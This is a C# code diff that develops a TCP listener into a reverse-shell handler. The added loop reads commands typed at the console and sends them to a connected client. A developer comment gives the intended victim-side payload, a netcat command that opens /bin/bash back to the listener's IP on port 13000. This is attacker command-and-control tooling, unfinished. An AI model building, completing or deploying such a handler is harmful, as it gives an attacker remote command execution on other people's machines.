@@ -56,27 +56,19 @@ namespace tcp_listener
                 TcpListener server = null;
                 try
                 {
-                    //initialise tcp on entered port
                     Int32 port = portno;
                     IPAddress localAddr = IPAddress.Parse(iplocal);
-
-                    // TcpListener server = new TcpListener(port);
                     server = new TcpListener(localAddr, port);
-
-                    // Start listening for client requests.
                     server.Start();
 
                     // Buffer for reading data
                     Byte[] bytes = new Byte[256];
                     String data = null;
 
-                    // Enter the listening loop.
                     while (true)
                     {
                         Console.Write("\n\nWaiting for a connection on " + portno);
 
-                        // Perform a blocking call to accept requests.
-                        // You could also use server.AcceptSocket() here.
                         TcpClient client = server.AcceptTcpClient();
                         Console.WriteLine("\nConnected!");
 
@@ -119,7 +111,11 @@ namespace tcp_listener
                         
                         while (client.Connected)
                         {
-                            //MAKING PROGRESS - need to put it in a loop so it doesn't just process one command
+                            //MAKING PROGRESS
+                            //maybe try convert to ASCII??
+                            //reason commands don't execute properly in bash is because it's sending the commands via DOS
+                            //need to figure out a way to convert from DOS to UNIX/bash online - potentially using
+                            //DOStoUNIX/other way round
                             //use above example for help
                             //ALSO new payload needs to be - nc -e /bin/bash 192.XXX.X.X 13000
                             //https://docs.microsoft.com/en-us/dotnet/api/system.io.streamwriter.-ctor?view=net-5.0#System_IO_StreamWriter__ctor_System_IO_Stream_
@@ -127,13 +123,18 @@ namespace tcp_listener
                             Byte[] newbytes = new Byte[256];
                             streamWriter = new StreamWriter(stream);
                             StringBuilder userinput = new StringBuilder();
-                            StreamReader rdr = new StreamReader(stream);
+                            StreamReader read = new StreamReader(stream);
 
-                            using (rdr)
+                            using (read)
                             {
-                                string text = Console.ReadLine();
-                                streamWriter.WriteLine(text);
-                                streamWriter.Flush();
+                                while (true)
+                                {
+                                    string text = Console.ReadLine();
+                                    //byte[] input = System.Text.Encoding.ASCII.GetBytes(text);
+                                    streamWriter.WriteLine(text);
+                                    streamWriter.AutoFlush = true;
+                                }
+                                
 
                             }
 
